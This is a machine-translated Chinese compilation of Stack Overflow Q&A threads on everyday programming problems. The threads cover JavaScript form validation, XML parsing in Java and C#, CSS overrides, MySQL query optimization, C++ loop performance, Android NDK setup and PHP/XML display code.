原因是如果您使用 OR 一旦第一个函数返回 true javascript 就不会费心检查其他函数。此外，您不想使用 OR，因为如果第一次检查为假而第二次检查为真，则表单仍将提交，因为您的至少一项检查为 TRUE。

请参阅[fiddle](http://jsfiddle.net/chrismoutray/NBh9K/)以显示此作品，两个检查都执行并显示警报消息，但由于 check2 返回 false 表单不提交 - 如果您想玩转 checks1 和 check2 函数的返回结果以及 && 和 || 的使用

更好理解问题后，需要使用单个&，但是因为`true & true`返回1而不是`true`需要这样写

> onsubmit="return ((validateName() & validatePhone() & validateAddress() & validateEmail()) == 1)"

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-04T05:44:44.077

如果您只需要确保所有函数在继续之前返回 true，则使用`&&`not`||` 并确保表达式不会被返回函数提前评估，请放置一些额外的括号

```
<form id="myForm" name="myForm" action="checked.html" method="post"
onsubmit="return (validateName() && validatePhone() && validateAddress() &&
validateEmail() )"> 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-04T06:05:30.597

创建一个包装函数，它调用每个函数并检查它们的返回值。在任何时候，如果返回值为 false，您可以通过此时返回 false 来停止表单提交，或者评估其余内容并最终返回 false。

所以 JS 一个可以做你想做的事情的代码是：

```
function validateForm() {
    var isFormValid = true;
    isFormValid &= validateName();
    isFormValid &= validatePhone();
    isFormValid &= validateAddress();
    isFormValid &= validateEmail();
    return isFormValid? true:false;
} 
```

现在在表格中简单地使用：

```
<form id="myForm" name="myForm" action="checked.html" method="post" onsubmit="return validateForm();"> 
```

[这是一个有效的 JSFiddle 示例。](http://jsfiddle.net/vVpkY/3/)

编辑：在下面做了一个嘘声，更正了。

使用 OR 是不正确的，但 AND 无法按预期工作的原因是[Short-circuit_evaluation](http://en.wikipedia.org/wiki/Short-circuit_evaluation)。

*   OR : 评估在第一个为真的操作数上停止并返回真*   AND : 评估在第一个为 false 的操作数处停止并返回 false

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-05-09T11:24:53.860

onsubmit="return validateName() && validatePhone() && validateAddress() && validateEmail()"

使用此代码

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-12-18T05:17:31.937

为了验证我的表单，我简单地创建了一个名为 validateForm(){} 的函数，然后在这个函数中我放置了完全验证所需的所有代码。然后使用 onsubmit="validateForm()"。它按顺序检查它，只有在所有条件都为真时才提交。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2017-07-19T10:16:53.343

以下方法检查第一个 validateName() 函数，如果只有第一个函数为真，它将处理检查下一个函数，同样要触发第三个函数需要返回第一个和第二个函数的 true。所以想象一下，如果所有函数都无效，即使你有不同的错误消息，你也只会看到第一个函数的错误消息。一旦 validateName() 函数通过，您可能会看到 validatePhone() 等错误消息。

```
<form id="myForm" name="myForm" action="checked.html" method="post"
onsubmit="return (validateName() && validatePhone() && validateAddress() &&
validateEmail() )"> 
```

如果您要在首次提交时根据上述所有验证显示错误消息，则不能使用上述方法，如果您想在提交时触发所有功能（或显示所有验证错误），则可以使用以下方法。

```
<form id="myForm" name="myForm" action="checked.html" method="post"
onsubmit=" if( ( validateName() && validatePhone() && validateAddress() &&
validateEmail() ) == false) { return false; } "> 
```

# java - 从 Java 中的 Web 服务响应中解析 CDATA 内容

> ID：11806259
> 
> 赞同：0
> 
> 时间：2012-08-04T05:41:42.847
> 
> 标签：java, xml, web-services, cdata, string-parsing

我正在我的 Java 代码中进行 Web 服务调用，并使用以下数据将响应作为字符串获取。

```
<DocumentElement>
   <ResultSet>
     <Response>Successfully Sent.</Response>
     <UsedCredits>1</UsedCredits>
   </ResultSet>
</DocumentElement> 
```

现在，我想解析下面的响应字符串并`<Response>`单独获取标签的值以进行进一步处理。因为，我只得到 CDATA 内容如何解析字符串内容？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T06:32:19.480

您显然需要 XML 解析器。可以说上面存储在一个`String`名为的变量中`content`

```
 DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    try {
          //Using factory get an instance of document builder
           DocumentBuilder db = dbf.newDocumentBuilder();
           InputSource is = new InputSource();
           is.setCharacterStream(new StringReader(content)); //content variable holding xml records         
           Document doc = db.parse(is)
           /* Now retrieve data from xml */
           NodeList nodes = doc.getElementsByTagName("ResultSet");
           Element elm = (Element) nodes.item(0);   //will get you <Response> Successfully Sent.</Response>
           String responseText = elm.getFirstChild().getNodeValue();

    }catch(ParserConfigurationException pce) {
        pce.printStackTrace();
    }catch(SAXException se) {
        se.printStackTrace();
    }catch(IOException ioe) {
        ioe.printStackTrace();
    } 
```

对于更大的数据集，请遵循上述解析器例程。对多个相似的数据集使用循环。希望有帮助。

# xcode - 如何更改 xcode 中快捷键生成的注释样式？

> ID：11806260
> 
> 赞同：4
> 
> 时间：2012-08-04T05:42:10.520
> 
> 标签：xcode, comments

我刚开始使用 XCode 4.3，但不喜欢 IDE 注释多行的方式。

当我选择多于 1 行然后按快捷键（命令 + / ）时，它会将“//”放在每行的前面。

是否可以使其分别对多行和单行使用 /* */ 和 //？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-05-06T13:48:56.447

不，不可能在快捷方式的帮助下将 /* */ 用于多个代码行。您将不得不手动进行。对于单行注释，将编辑竖条移动到特定行并按 ctrl+/ 。

# c# - 将大型 xml 文件拆分为子文件而不会发生内存争用

> ID：11806261
> 
> 赞同：6
> 
> 时间：2012-08-04T05:42:22.253
> 
> 标签：c#, xml

我有一个如下的 XML

```
<Jobs>
   <job>
   ....
   </job>
   <job>
   ....
   </job>
   ....
</Jobs> 
```

现在，在不使用 xmlreader 和 xmlwriter 或任何其他选项将整个文件放入内存的情况下，将每个作业节点写入单独文件中的最佳方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-04T05:51:45.053

1.  为输入文件创建一个 XmlReader。
2.  将阅读器放在第一个作业元素上。
3.  [使用ReadSubtree 方法](http://msdn.microsoft.com/en-us/library/system.xml.xmlreader.readsubtree.aspx)创建子树 XmlReader 。
4.  为输出文件创建一个 XmlWriter。
5.  [使用WriteNode 方法](http://msdn.microsoft.com/en-us/library/1wd6aw1b.aspx)将子树 XmlReader 的内容复制到 XmlWriter 中。
6.  将原始阅读器放在下一个作业元素上，像第一个作业元素一样继续。
    如果没有更多要阅读的工作元素，请中断。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-05T08:14:02.907

XSLT 3.0 和流式传输还处于早期阶段，但以下 XSLT 3.0 样式表应该在 Saxon-EE 9.4 中完成这项工作：

```
<xsl:stylesheet version="3.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:mode streamable="yes" on-no-match="shallow-copy">
<xsl:template match="job">
  <xsl:result-document href="job{position()}.xml">
    <xsl:next-match/>
  </xsl:result-document>
</xsl:template>
</xsl:stylesheet> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T05:52:50.310

如果数据确实看起来与您描述的完全一样（包括空格），那么最好的选择是使用 StreamReader。它有一个读取到当前行末尾的方法。您阅读行，直到到达`</job>`. 然后冲洗该工作并重复。

另外，我不认为 XmlReader 是一个糟糕的选择。

# cocoa - NSWorkspace 的 - (void)showSearchResultsForQueryString 方法的授权密钥是什么？

> ID：11806262
> 
> 赞同：0
> 
> 时间：2012-08-04T05:42:27.457
> 
> 标签：cocoa, sandbox

我在任何地方都找不到 NSWorkSpace 的 showSearchResultsForQueryString 的授权密钥，包括苹果开发者论坛。谁能帮我？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T10:00:17.427

理想情况下，“showSearchResultsForQueryString”也应该像沙盒应用程序中的“openURL”方法一样工作。在沙盒应用程序中拒绝此方法是 sdk 错误。

# css - 子 CSS 样式覆盖

> ID：11806263
> 
> 赞同：-1
> 
> 时间：2012-08-04T05:42:31.113
> 
> 标签：css

假设我们有如下的 Html 结构。

```
<table class="main-tb">
<tr>
<td>
</td>
<td id ="mytd">
</td>
</tr>
</table> 
```

并且应用的 css 文件定义如下。

```
.main-tb 
{
    font-size: 13px; 
    line-height: 20px;
    padding: 5px 10px;

}
.main-tb th 
{
    background-color: #F8F8F8;
    border-color: #CCCCCC -moz-use-text-color;
    border-style: solid none;
    border-width: 1px 0;
    line-height: 22px;
    padding: 5px 10px;    
}

.main-tb td 
{
    border-color: #CCCCCC;
    border-style: dotted;
    border-width: 0 0 1px;/**/
    line-height: 22px;
    padding: 5px 10px;
} 
```

我们可以看到`.main-tb td`样式应用于表格中的所有 td 元素。现在，如果我想对名为 的 td 元素之一应用不同的样式`mytd`，例如从`.main-tb td`. 那么，我该怎么办？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T05:45:34.450

`#mytd`比 更具体`.main-tb td`，因此您只需从 中删除边框`#mytd`。

```
#mytd {
    border: 0 none;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T05:45:56.557

`.main-tb td #mytd`您可以简单地使用or选择该元素`#mytd`（因为 id 是唯一的）并用于`border: 0;`删除边框。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-04T05:47:24.013

`!important`在课堂上使用

```
#mytd {
    border-color: #fff !important;
    OR
    border-color: transparent !important;    
} 
```

# objective-c - 将 GameCenterManager 转换为 ARC

> ID：11806264
> 
> 赞同：0
> 
> 时间：2012-08-04T05:42:33.127
> 
> 标签：objective-c, ios, xcode, automatic-ref-counting, game-center

我正在使用 Apple 的 GKTapper 演示中的 GameCenterManger。我决定将我的项目转换为 arc，但我不断收到错误消息“GameCenterManager.h:67:43：当前部署目标不支持自动 __weak 引用”。任何帮助将不胜感激，谢谢！ [https://developer.apple.com/library/ios/#samplecode/GKTapper/Introduction/Intro.html](https://developer.apple.com/library/ios/#samplecode/GKTapper/Introduction/Intro.html)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T06:17:23.073

“弱”不支持 iOS 4.0 目标。

第一种方式...如果您的项目较新。将目标更改为 iOS 5.0 或更高版本。

第二种方式...您应该支持iOS 4.0。您可以使用分配关键字。但是 assign 不支持设置为零。

# mysql - 优化mysql查询：奖牌榜

> ID：11806268
> 
> 赞同：1
> 
> 时间：2012-08-04T05:42:54.437
> 
> 标签：mysql, optimization

我有 2 张桌子：

1.  Olympic_medalists 与列 gold_country、silver_country、bronze_country

2.  带有国家列的标志

我想相应地列出奥运奖牌表。我有这个查询，它有效，但它似乎杀死了 mysql。希望有人可以帮助我优化查询。

```
SELECT DISTINCT country AS sc,
    IFNULL(
        (SELECT COUNT(silver_country) 
            FROM olympic_medalists 
        WHERE silver_country = sc AND silver_country != '' 
        GROUP BY silver_country),0) AS silver_medals, 
    IFNULL(
        (SELECT COUNT(gold_country) 
            FROM olympic_medalists 
        WHERE gold_country = sc AND gold_country != '' 
        GROUP BY gold_country),0) AS gold_medals,
    IFNULL(
        (SELECT COUNT(bronze_country) 
            FROM olympic_medalists 
        WHERE bronze_country = sc AND bronze_country != '' 
        GROUP BY bronze_country),0) AS bronze_medals
FROM olympic_medalists, flags 
GROUP BY country, gold_medals, silver_country, bronze_medals HAVING (
    silver_medals >= 1 || gold_medals >= 1 || bronze_medals >= 1)
ORDER BY gold_medals DESC, silver_medals DESC, bronze_medals DESC,   
SUM(gold_medals+silver_medals+bronze_medals) 
```

结果将是：

```
country  |  g  |  s  |  b  |  tot
---------------------------------
country1 |  9  |  5  |  2  |  16
country2 |  5  |  5  |  5  |  15 
```

等等

谢谢！

```
olympic medalists:

  `id` int(8) NOT NULL auto_increment,
  `gold_country` varchar(64) collate utf8_unicode_ci default NULL,
  `silver_country` varchar(64) collate utf8_unicode_ci default NULL,
  `bronze_country` varchar(64) collate utf8_unicode_ci default NULL, PRIMARY KEY  (`id`)

flags

  `id` int(11) NOT NULL auto_increment,
  `country` varchar(128) default NULL,
  PRIMARY KEY  (`id`) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T06:27:59.017

这将比您当前`SELECT`为交叉连接关系中的每一行执行三个不同子查询的解决方案高效得多（您想知道为什么它会停止！）：

```
SELECT    a.country,
          COALESCE(b.cnt,0)     AS g,
          COALESCE(c.cnt,0)     AS s,
          COALESCE(d.cnt,0)     AS b,
          COALESCE(b.cnt,0) +
          COALESCE(c.cnt,0) +
          COALESCE(d.cnt,0)     AS tot
FROM      flags a
LEFT JOIN (
          SELECT   gold_country, COUNT(*) AS cnt 
          FROM     olympic_medalists 
          GROUP BY gold_country
          ) b ON a.country = b.gold_country
LEFT JOIN (
          SELECT   silver_country, COUNT(*) AS cnt 
          FROM     olympic_medalists 
          GROUP BY silver_country
          ) c ON a.country = c.silver_country
LEFT JOIN (
          SELECT   bronze_country, COUNT(*) AS cnt 
          FROM     olympic_medalists 
          GROUP BY bronze_country
          ) d ON a.country = d.bronze_country 
```

* * *

更快的是，不是在金、银和青铜列中存储实际的文本国家名称，而是存储基于整数的国家`id`。整数比较总是比字符串比较快。

此外，一旦您将`olympic_medalists`表中的每个国家/地区名称替换为相应的 id，您将希望在每列（金、银和青铜）上创建一个索引。

将文本名称更新为它们对应`id`的 's 是一项简单的任务，可以通过单个`UPDATE`语句和一些`ALTER TABLE`命令来完成。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T06:36:20.083

尝试这个：

```
SELECT F.COUNTRY,IFNULL(B.G,0) AS G,IFNULL(B.S,0) AS S,
IFNULL(B.B,0) AS B,IFNULL(B.G+B.S+B.B,0) AS TOTAL
FROM FLAGS F LEFT OUTER JOIN
      (SELECT A.COUNTRY,
         SUM(CASE WHEN MEDAL ='G' THEN 1 ELSE 0 END) AS G,
         SUM(CASE WHEN MEDAL ='S' THEN 1 ELSE 0 END) AS S,
         SUM(CASE WHEN MEDAL ='B' THEN 1 ELSE 0 END) AS B
      FROM   
          (SELECT GOLD_COUNTRY AS COUNTRY,'G' AS MEDAL 
           FROM OLYMPIC_MEDALISTS WHERE GOLD_COUNTRY IS NOT NULL
           UNION ALL
           SELECT SILVER_COUNTRY AS COUNTRY,'S' AS MEDAL 
           FROM OLYMPIC_MEDALISTS WHERE SILVER_COUNTRY IS NOT NULL
           UNION ALL
           SELECT BRONZE_COUNTRY AS COUNTRY,'B' AS MEDAL 
           FROM OLYMPIC_MEDALISTS WHERE BRONZE_COUNTRY IS NOT NULL)A
      GROUP BY A.COUNTRY)B
 ON F.COUNTRY=B.COUNTRY
 ORDER BY IFNULL(B.G,0) DESC,IFNULL(B.S,0) DESC,
          IFNULL(B.B,0) DESC,IFNULL(B.G+B.S+B.B,0) DESC,F.COUNTRY 
```

# android - 在android中运行opencv示例失败

> ID：11806269
> 
> 赞同：0
> 
> 时间：2012-08-04T05:42:54.780
> 
> 标签：android, opencv

最近，我想学习如何在android中使用opencv，但我一开始就卡住了。

我按照[这个页面](http://opencv.itseez.com/doc/tutorials/introduction/android_binary_package/android_binary_package_using_with_NDK.html#android-binary-package-with-ndk)学习如何构建环境，但是当我运行示例“Tutorial 1-Add OpenCV”时，它会出现![这种变暖](../Images/4a0275233a5a531146619cf50bd83794.png)

环境：

jdk 1.6 33更新

日食朱诺

安卓4.0

ndk r8b

有谁知道我犯了什么样的错误？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T07:00:41.547

你真的读过警告信息吗？它说如果没有[OpenCV manager](http://opencv.itseez.com/android/service/doc/Intro.html) ，您的程序将无法运行。它是在 2.4.2 版本中添加的。所以你需要做的就是安装它。

# android - 基于 Android NativeActivity 的项目中的源代码位置

> ID：11806270
> 
> 赞同：1
> 
> 时间：2012-08-04T05:43:09.603
> 
> 标签：android, android-ndk

有没有办法将我的源代码（包括所有 .h .cpp 和 .mk 文件）重新定位到项目文件夹之外？换句话说，我想将 jni 文件夹的内容移出 android 项目文件夹。现在，我的项目的物理结构如下所示：

```
.../ProjectFolder/AndroidProjectFolder/jni/(sources and make files)
.../ProjectFolder/AndroidProjectFolder/(other android project files)
.../ProjectFolder/iosProjectFolder/(other ios project files) 
```

我想做这样的：

```
.../ProjectFolder/src/(sources and make files)
.../ProjectFolder/AndroidProjectFolder/(other android project files)
.../ProjectFolder/iosProjectFolder/(other ios project files) 
```

有什么正确的方法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-04T05:54:53.163

是的，你可以这么做。我使用 jni 上面的目录，例如 MyProject/src/ 这个示例构建一个共享库...您也可以构建静态库。注意 $(call my-dir)/.. 'call my-dir)' 指向包含 Android.mk 文件的 jni 目录。因此，添加 /.. 将其备份到一个目录。

```
LOCAL_PATH  := $(call my-dir)/..

include $(CLEAR_VARS)

FILE_LIST := $(wildcard $(LOCAL_PATH)/src/*.cpp)

ifdef DEBUG
CONFIG_DIR  := Debug
LOCAL_CFLAGS    := -Werror -Wno-psabi -O0 -ggdb -D_DEBUG
LOCAL_CXXFLAGS    := -Werror -Wno-psabi -O0 -ggdb -D_DEBUG -fexceptions
LOCAL_LINK_FLAGS    := -ggdb
else
CONFIG_DIR  := Release
LOCAL_CFLAGS    := -Werror -Wno-psabi -O2 -DNDEBUG
LOCAL_CXXFLAGS  := -Werror -Wno-psabi -O2 -DNDEBUG -fexceptions
endif

LOCAL_MODULE    := MyProject
LOCAL_SRC_FILES := $(FILE_LIST:$(LOCAL_PATH)/%=%)
LOCAL_C_INCLUDES := $(LOCAL_PATH)/include
LOCAL_LDFLAGS   := $(LOCAL_LINK_FLAGS)
LOCAL_LDLIBS    += -lGLESv2 -landroid -llog -lGLESv1_CM -lEGL

include $(BUILD_SHARED_LIBRARY) 
```

# c++ - c ++循环在每次迭代时变慢

> ID：11806276
> 
> 赞同：2
> 
> 时间：2012-08-04T05:45:04.700
> 
> 标签：c++, for-loop

在 C++ 中，我使用嵌套的 for 循环来匹配具有相同名称的对象对。我预计程序需要很长时间才能运行（比较数千个字符串），但随着它的进展，程序运行速度越来越慢。它会在几分钟内比较前 20% 的字符串，但一旦完成大约 30%，就需要将近 60 秒来检查一个字符串与其他字符串。

我的“新数据”包含字段“feas”、“eff”和“numIdeas”的正确值，而我的旧数据与匹配的“新”伙伴共享“数据”字段。新数据和旧数据的顺序不同，我无法对它们进行排序，因为它们当前所处的顺序是有意义的。我认为最好的方法是通过它“蛮力”。就像我说的那样，它们没有特定的顺序，所以循环迭代的极度减慢让我感到困惑。据我所知，速度应该保持不变。

```
for(int i=0; i< newDO.getNumItems(); i++)
{
    Item newItem = newDO.getItem(i);

    for(int k=0; k < oldDO.getNumItems(); k++)
    {
        Item oldItem = oldDO.getItem(k);
        if(oldItem.getType()==1)
        {
            bool same = testStrings(oldItem.getData(), newItem.getData());

            if(same)
            {
               oldItem.setFeas(newItem.getFeas());
               oldItem.setEff(newItem.getEff());
               oldItem.setNumIdeas(newItem.getNumIdeas());
               break;
            }
        }
    }
} 
```

我没有写这个`testStrings`函数，但我没有看到任何真正的问题。此函数接受字符串（大约 5-20 个字符）并取出所有空格和 '('。

（据我了解，在我之前的那个人已经导入了数千个文件，然后才意识到解析它们的函数没有从某些数据中正确删除'（'，所以他对此的解决方法是在检查是否字符串相等）。

```
bool testStrings(string s1, string s2)
{
    string s1def ="";
    for(int i=0; i<s1.length(); i++)
    {
        if(s1[i]!=' ' || s1[i]!=')'){s1def+=s1[i];}
    }
    string s2def = "";
    for(int i=0; i<s2.length(); i++)
    {
        if(s2[i]!=' ' || s2[i]!=')'){s2def+=s2[i];}
    }
    if(s1def == s2def){return true;}
    else{return false;}
} 
```

任何见解都会非常有帮助。

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-04T07:21:29.453

这段代码几乎可以用来演示如何做错事。

正如@jahhaj 已经提到的，您似乎正在使用二次算法。

您通过去除比较函数中的额外字符来复合它，因为这意味着您每次进行比较时都会去除额外的字符，而不是只预先进行一次。

如果我这样做，我会先创建一个结构，如：

```
struct index { 
   std::string key;
   size_t subscript;
} 
```

您将通过将要比较的字符串复制到 中来初始化它`key`，并将该项目的下标复制到 中`subscript`。

然后遍历并从这些字符串中去除多余的字符（' ' 和 ')'）。然后对这些数组进行排序，只比较`key`字段。然后使用`std::set_intersection`来查找常见的项目。

通过复制和排序键，您将能够利用排序而不影响数据的（重要）现有顺序。通过预先去除多余的字符，您将只对每个键进行一次剥离。通过使用`set::intersection`，您可以获得具有线性复杂度而不是二次复杂度的常见项目。

明显的缺点是复制字符串显然会增加您必须存储的数据量。但是，如果项目的数量足够大，可以产生很大的不同，那么您也有足够的时间从二次复杂度到线性复杂度将节省*大量时间。*复制数据是合理的，即使这意味着您必须暂时将其他数据写入磁盘才能做到这一点。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-04T05:56:25.047

1) 如果没有 a) 看到更多您的实际代码，并且 b) 了解您的数据集，我们无法确定任何事情。

2）看起来你没有“添加”任何东西，或者“增长”任何结构。

......但是（这只是一个猜测）......

3) 假设两个数组都已排序：array1 = {1, 2, 3, ... 999}; 数组2 = {1, 3, 4, ... 1001}。

在您的早期迭代中，您将很快遇到“中断”。例如，array1[0] 将在您循环一次之前匹配 array2[0]。

但是，在您以后的迭代中，您必须执行内部循环 100 次或更多次才能找到您要查找的项目。

也许整个问题是 a) 迭代地执行 b) 线性搜索 c) 有序数据集。

再次 - 只是一个猜测。

恕我直言...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T08:53:55.517

此处速度变慢的唯一原因可能是以数据为中心，如果您的新集合很大，并且包含许多旧集合中不存在的新项目，在这种情况下，将搜索整个新集合以查找旧集合中的每个字符串.

请遵循 Jerry Coffin 的建议，使用清理后的字符串复制您的集合，根据 对它们进行排序`string::compare`，然后以线性方式遍历它们中的两个，就像`std::merge`这样做：

```
1  2  4 5   8  10 11 12 14 17 20 24  ...
1  2  4  6  8  10             20       50 ... 
```

由于您需要更新旧集合中的原始项目，因此在其每个项目的副本中添加另一个字段，携带*指向*正在复制的原始项目的指针，并在找到重复项时更新*它。*然后丢弃两个副本。

你的两个系列的尺寸是多少？

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-08-04T05:50:45.817

你是如何衡量表现的？实际上，这种行为可能有很多原因（算法问题、cpu 缓存、编译器设置），但是如果不查看代码使用的源代码和实际字符串数据，就很难回答你的问题......你能展示你的字符串比较算法的实现？

# iphone - 在 Xcode 4.1 中，数据库文件未显示在构建文件中

> ID：11806278
> 
> 赞同：1
> 
> 时间：2012-08-04T05:45:24.107
> 
> 标签：iphone

使用 xcode 4.1 我正在开发一个具有数据库集成的应用程序。我能够在 firefox Sqlite Manager 插件上执行所有功能。当我将数据添加到 Firefox 时，数据正在通过查询正确添加。但我无法在我的应用程序的构建文件夹中找到数据库文件。如何从应用程序中获取此文件以及从何处获取此文件？我必须检查从应用程序插入的数据是否正确插入，因为在选择和显示数据时，应用程序崩溃。

提前感谢您指导我并解决此问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T07:09:08.700

在 iphone simolator 中运行应用程序，然后插入数据并在路径中查看 sqlite 文件

```
home>Library>Application Support>Iphone Simulator>simulator type(like 5.0)>Applications 
```

这条路径有很多文件夹。文件夹包含模拟器中所有已安装应用程序的应用程序数据。搜索您的应用程序并打开

```
Documents folder 
```

在这里你有你的 sqlite 文件，它存储你所有插入的数据

有时文件夹是隐藏的。所以请检查隐藏的文件和文件夹

希望这会有所帮助。

# web-services - 在码头运行axis2 webservice时出现轴故障

> ID：11806280
> 
> 赞同：0
> 
> 时间：2012-08-04T05:45:55.367
> 
> 标签：web-services, jetty, axis2, embedded-jetty

```
java.lang.NullPointerException
    at org.apache.axis2.clustering.context.DefaultContextManager.updateContexts(DefaultContextManager.java:81)
    at org.apache.axis2.clustering.context.Replicator.replicate(Replicator.java:81)
    at org.apache.axis2.receivers.AbstractMessageReceiver.replicateState(AbstractMessageReceiver.java:71)
    at org.apache.axis2.receivers.AbstractInOutMessageReceiver.invokeBusinessLogic(AbstractInOutMessageReceiver.java:41)
    at org.apache.axis2.receivers.AbstractMessageReceiver.receive(AbstractMessageReceiver.java:100)
    at org.apache.axis2.engine.AxisEngine.receive(AxisEngine.java:176)
    at org.apache.axis2.transport.http.HTTPTransportUtils.processHTTPPostRequest(HTTPTransportUtils.java:275)
    at org.apache.axis2.transport.http.AxisServlet.doPost(AxisServlet.java:131)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:637)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
    at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:598)
    at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:442)
    at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:131)
    at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:524)
    at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:225)
    at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1033)
    at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:369)
    at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:186)
    at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:967)
    at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:129)
    at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:111)
    at org.eclipse.jetty.server.Server.handle(Server.java:358)
    at org.eclipse.jetty.server.AbstractHttpConnection.handleRequest(AbstractHttpConnection.java:452)
    at org.eclipse.jetty.server.AbstractHttpConnection.content(AbstractHttpConnection.java:894)
    at org.eclipse.jetty.server.AbstractHttpConnection$RequestHandler.content(AbstractHttpConnection.java:948)
    at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:943)
    at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:235)
    at org.eclipse.jetty.server.AsyncHttpConnection.handle(AsyncHttpConnection.java:77)
    at org.eclipse.jetty.io.nio.SelectChannelEndPoint.handle(SelectChannelEndPoint.java:622)
    at org.eclipse.jetty.io.nio.SelectChannelEndPoint$1.run(SelectChannelEndPoint.java:46)
    at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:603)
    at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:538)
    at java.lang.Thread.run(Unknown Source) 
```

# android - EditText 光标移动到结尾

> ID：11806285
> 
> 赞同：-1
> 
> 时间：2012-08-04T05:46:46.430
> 
> 标签：android, cursor, ime

目前正在开发键盘。每当我按下 EditText 时，打字光标会自动移动到 EditText 中所有单词的末尾。它不会让我在句子中间开始编辑。

场景：

用户按下 EditText 并弹出我的键盘。用户键入“香蕉”。用户退出键盘（键盘关闭）。用户按下带有单词“Banana”的edittext并按下中间的N。光标在N之后出现半秒，然后自动移动到单词的末尾。

基本上我正在寻找的是如何阻止 IME 自动执行此操作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T06:09:05.527

通过以下方式将**setSelection(int no)**与EditText 的**OnFocusChangeListener()**一起使用：

```
et1.setOnFocusChangeListener(new OnFocusChangeListener() {
            @Override
            public void onFocusChange(View v, boolean hasFocus) {
                if(v.hasFocus()) {
                    int len = et1.getEditableText().toString().trim().length();
                    if(len > 1)
                        et1.setSelection((int)len/2);
                }
            }
        }); 
```

# java - PHP、Java小程序通讯

> ID：11806287
> 
> 赞同：0
> 
> 时间：2012-08-04T05:46:51.250
> 
> 标签：java, php, javascript, applet, applet-servlet

这就是我想做的。

我的服务器中有一个 PHP 文件，我想在其中调用 java 小程序。小程序函数将发送一个获取请求以从第三方服务器读取页面。现在我希望从小程序函数读取的页面发送到 PHP 脚本。简单地说，我想要一个 PHP 变量中的 applet 请求函数的返回值。有可能吗？

我想这样做是因为我已经有了在 PHP 中解析页面信息的代码，所以我不想再次在 java 中重写它。

我想要 Java 小程序，因为必须使用 IP 等客户端信息发送请求。所以我不想使用代理。

**注意：**我不是要破解任何人的服务器。我不是 Java 或 PHP 的高级程序员。请以描述性的方式回复我，可能使用伪代码。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T06:01:10.050

> 我已经有了用 PHP 解析页面信息的代码，所以我不想再用 java 重写它。

PHP 应该能够比 Java 小程序更容易地获取该页面。小程序需要受信任或与使用明确允许热链接的“跨域资源”文件的站点通信。

对“php proxie”的搜索似乎溢出了大约 732 万次点击。我会从那里开始。

# php - 从表单字段中复制数据并将其放在 echo 语句中，所有这些都在 $xml=simplexml_load_file 函数中

> ID：11806289
> 
> 赞同：0
> 
> 时间：2012-08-04T05:47:24.263
> 
> 标签：php, javascript, syntax, onblur

我正在通过该`$xml=simplexml_load_file`函数从 XML 文件加载和回显数据。一切正常，代码如下（部分）：

```
<?php
$xml=simplexml_load_file('testfeed1.xml');
        $max = 12;
        $i = 1;
foreach($xml->someTag as $feed){ 
if ($i <= $max){

echo "<span class='previewImage' name='{$feed->some-subTag}' 
style='background:url({$feed->imageTag}) no-repeat center;'>";
                $i++;
            } 
          }  
    ?> 
```

在此示例中，我从 XML 中的标记中绘制 URL 并将其放置在给定跨度的背景中，数组中的所有图像（如果该词的正确用法）显示没有任何问题。

我非常想弄清楚的是，如何根据`onBlur`页面上的表单字段中设置的函数来更改这个简短示例中的背景。

因此，如果我有以下代码：

```
Image URL: <input type='text' name='smallImage' id='someId' 
value='{$feed->imageTag}' /> 
```

如您所见，该字段也预加载了此处 XML 中的“imageTag”。

在编写新 URL 后，我可以使用什么语法或函数来更改上面 span 的背景。我假设该`onBlur`功能将是最好的。

```
<input type='text' name='smallImage' id='someId' value='{$feed->smallImage}' 
onblur="document.find(.imagePreview#{$feed->some-subTag}).setAttribute("background", .smallImage.someId.value);" /> 
```

同样，我对 js 和 php 完全陌生。

